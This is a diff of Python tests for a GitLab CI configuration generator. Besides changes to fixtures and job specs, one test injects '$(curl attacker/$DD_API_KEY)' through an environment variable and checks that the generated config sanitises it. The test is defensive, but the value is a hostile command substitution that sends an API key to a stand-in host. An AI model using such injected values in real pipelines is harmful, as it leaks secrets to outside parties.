@@ -21,6 +21,12 @@ def gen_gitlab_config_mod():
     yaml = types.ModuleType("ruamel.yaml")
 
     class YAML:
+        def __enter__(self):
+            return self
+
+        def __exit__(self, *_args):
+            return None
+
         def load(self, content):
             return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}
 
@@ -64,8 +70,7 @@ def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatc
 def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
 
-    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
-        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
+    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
 
     assert '    - export NIGHTLY_BUILD="false"' in config
     assert "$(curl" not in config
@@ -86,3 +91,40 @@ def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_
     assert 'if [[ "false" == "true" ]]' in config
     assert "$(curl" not in config
     assert "$DD_API_KEY" not in config
+
+
+def test_collect_all_suite_venv_info_expands_declarative_matrix(gen_gitlab_config_mod):
+    suite = {
+        "matrix": {
+            "command": "pytest tests/contrib/requests",
+            "dependencies": ["pytest"],
+            "python": ["3.11", "3.12"],
+        },
+    }
+    info = gen_gitlab_config_mod.collect_all_suite_venv_info({"contrib::requests": suite})
+
+    assert info["contrib::requests"].venv_count == 2
+    assert info["contrib::requests"].python_versions == {"3.11", "3.12"}
+
+
+def test_jobs_use_uv_locks_and_base_venv_artifacts(gen_gitlab_config_mod):
+    config = str(
+        gen_gitlab_config_mod.JobSpec(
+            name="requests",
+            suite="contrib::requests",
+            stage="contrib",
+            snapshot=True,
+            services=["httpbin"],
+            python_versions={"3.12"},
+        )
+    )
+
+    assert "extends: .test_base_snapshot" in config
+    assert "TEST_SUITE: contrib::requests" in config
+    assert 'UV_NO_CACHE: "1"' in config
+    assert "uv run --no-project --python 3.9" in config
+    assert "--with-requirements .uv/wait--wait-py39.txt" in config
+    assert 'DD_TRACE_AGENT_URL="http://testagent:9126" AGENT_VERSION="testagent"' in config
+    assert "    - job: build_base_venvs" in config
+    assert "      artifacts: true" in config
+    assert '          - PYTHON_VERSION: "3.12"' in config
